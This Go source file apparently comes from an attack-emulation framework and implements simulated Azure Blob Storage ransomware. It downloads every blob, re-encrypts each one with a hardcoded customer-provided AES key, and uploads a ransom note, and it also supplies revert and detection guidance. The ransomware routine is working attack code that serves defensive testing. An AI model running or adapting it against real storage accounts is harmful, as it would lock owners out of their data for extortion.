package azure

import (
	"bytes"
	"context"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"strings"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore/to"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob/blob"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

// AES-256 encryption key (32 bytes) used for customer-provided encryption
var EncryptionKey = []byte("427fc7323cfb4b58f630789d372476fb")
var Base64EncodedKey = base64.StdEncoding.EncodeToString(EncryptionKey)
var keySHA256 = sha256.Sum256(EncryptionKey)
var Base64EncodedKeySHA256 = base64.StdEncoding.EncodeToString(keySHA256[:])

const RansomContainerName = "your-files-encrypted"
const RansomNoteFilename = "FILES-ENCRYPTED.txt"
const RansomNoteContents = "Your data has been encrypted with a customer-provided encryption key that only we possess. To negotiate for the decryption key, contact evil@hackerz.io. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable."

const CodeBlock = "```"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.impact.blob-ransomware-cpek",
		FriendlyName: "Azure Blob Storage ransomware through Customer-Provided Encryption Keys",
		Description: `
Simulates Azure Blob Storage ransomware activity that encrypts files using Customer-Provided Encryption Keys (CPK).
This is the Azure equivalent of the AWS SSE-C ransomware technique.
The attacker downloads existing blobs and re-uploads them encrypted with a customer-provided AES-256 key that only they possess.
Without the key, the blobs cannot be read.

Warm-up:

- Create an Azure Storage Account
- Create multiple storage containers in the account
- Create a number of blobs in the containers with random content and file extensions

Detonation:

- Download all blobs
- Re-upload each blob encrypted with a customer-provided AES-256 key
- Upload a ransom note

References:

- https://learn.microsoft.com/en-us/azure/storage/blobs/encryption-customer-provided-keys
`,
		Detection: `
You can detect this ransomware activity by monitoring for high volumes of <code>GetBlob</code> followed by <code>PutBlob</code> operations, especially when <code>PutBlob</code> requests include customer-provided encryption key headers (<code>x-ms-encryption-algorithm: AES256</code>).

In Azure Storage diagnostic logs, look for:

1. Unusual volume of read (<code>GetBlob</code>) followed by write (<code>PutBlob</code>) operations on the same blobs.
2. <code>PutBlob</code> operations with the <code>x-ms-encryption-algorithm</code> request header set to <code>AES256</code>, indicating customer-provided key usage.

Sample Azure Storage diagnostic log event for a PutBlob with customer-provided key:

` + CodeBlock + `json
{
  "time": "2024-01-01T00:00:00.0000000Z",
  "operationName": "PutBlob",
  "category": "StorageWrite",
  "statusCode": 201,
  "properties": {
    "accountName": "<storage-account-name>",
    "userAgentHeader": "azsdk-go-azblob/v1.6.3",
    "serviceType": "blob"
  }
}
` + CodeBlock + `
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	storageAccount := params["storage_account_name"]
	blobServiceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccount)

	azureConfig := providers.Azure()

	log.Println("Simulating a CPEK ransomware attack on storage account " + storageAccount)

	blobClient, err := utils.GetAzureBlobClient(blobServiceURL, azureConfig.SubscriptionID, azureConfig.GetCredentials(), azureConfig.ClientOptions, params)
	if err != nil {
		return fmt.Errorf("failed to instantiate Blob Client: %w", err)
	}

	if err := encryptAllBlobsWithCPK(blobClient); err != nil {
		return fmt.Errorf("failed to encrypt blobs with customer-provided key: %w", err)
	}

	log.Println("Uploading ransom note...")
	if err := utils.UploadBlob(blobClient, RansomContainerName, RansomNoteFilename, strings.NewReader(RansomNoteContents)); err != nil {
		return fmt.Errorf("failed to upload ransom note: %w", err)
	}

	log.Println("Technique execution completed - blobs are now encrypted with a customer-provided key")
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	storageAccount := params["storage_account_name"]
	blobServiceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccount)

	azureConfig := providers.Azure()

	log.Println("Reverting CPEK encryption on storage account " + storageAccount)

	blobClient, err := utils.GetAzureBlobClient(blobServiceURL, azureConfig.SubscriptionID, azureConfig.GetCredentials(), azureConfig.ClientOptions, params)
	if err != nil {
		return fmt.Errorf("failed to instantiate Blob Client: %w", err)
	}

	if err := decryptAllBlobs(blobClient); err != nil {
		return fmt.Errorf("failed to decrypt blobs: %w", err)
	}

	log.Println("Successfully reverted CPEK encryption")
	return nil
}

func encryptAllBlobsWithCPK(client *azblob.Client) error {
	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return fmt.Errorf("unable to list blobs: %w", err)
	}

	totalBlobs := 0
	for _, versionMap := range blobMap {
		totalBlobs += len(versionMap)
	}

	log.Printf("Found %d blobs to encrypt across %d containers", totalBlobs, len(blobMap))
	log.Printf("Encrypting all blobs with customer-provided AES-256 key")

	cpkInfo := &blob.CPKInfo{
		EncryptionKey:       to.Ptr(Base64EncodedKey),
		EncryptionKeySHA256: to.Ptr(Base64EncodedKeySHA256),
		EncryptionAlgorithm: to.Ptr(blob.EncryptionAlgorithmTypeAES256),
	}

	for containerName, versionMap := range blobMap {
		for blobName := range versionMap {
			downloadResp, err := client.DownloadStream(context.Background(), containerName, blobName, nil)
			if err != nil {
				return fmt.Errorf("unable to download blob %s from container %s: %w", blobName, containerName, err)
			}

			blobContent, err := io.ReadAll(downloadResp.Body)
			downloadResp.Body.Close()
			if err != nil {
				return fmt.Errorf("unable to read blob %s content: %w", blobName, err)
			}

			_, err = client.UploadStream(context.Background(), containerName, blobName, bytes.NewReader(blobContent), &azblob.UploadStreamOptions{
				CPKInfo: cpkInfo,
			})
			if err != nil {
				return fmt.Errorf("unable to upload encrypted blob %s: %w", blobName, err)
			}
		}
	}

	log.Println("Successfully encrypted all blobs with customer-provided key")
	return nil
}

func decryptAllBlobs(client *azblob.Client) error {
	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return fmt.Errorf("unable to list blobs: %w", err)
	}

	log.Printf("Decrypting all blobs using customer-provided AES-256 key")

	cpkInfo := &blob.CPKInfo{
		EncryptionKey:       to.Ptr(Base64EncodedKey),
		EncryptionKeySHA256: to.Ptr(Base64EncodedKeySHA256),
		EncryptionAlgorithm: to.Ptr(blob.EncryptionAlgorithmTypeAES256),
	}

	for containerName, versionMap := range blobMap {
		if containerName == RansomContainerName {
			continue
		}
		for blobName := range versionMap {
			downloadResp, err := client.DownloadStream(context.Background(), containerName, blobName, &azblob.DownloadStreamOptions{
				CPKInfo: cpkInfo,
			})
			if err != nil {
				return fmt.Errorf("unable to download encrypted blob %s from container %s: %w", blobName, containerName, err)
			}

			blobContent, err := io.ReadAll(downloadResp.Body)
			downloadResp.Body.Close()
			if err != nil {
				return fmt.Errorf("unable to read blob %s content: %w", blobName, err)
			}

			_, err = client.UploadStream(context.Background(), containerName, blobName, bytes.NewReader(blobContent), nil)
			if err != nil {
				return fmt.Errorf("unable to upload decrypted blob %s: %w", blobName, err)
			}
		}
	}

	log.Println("Successfully decrypted all blobs")
	return nil
}
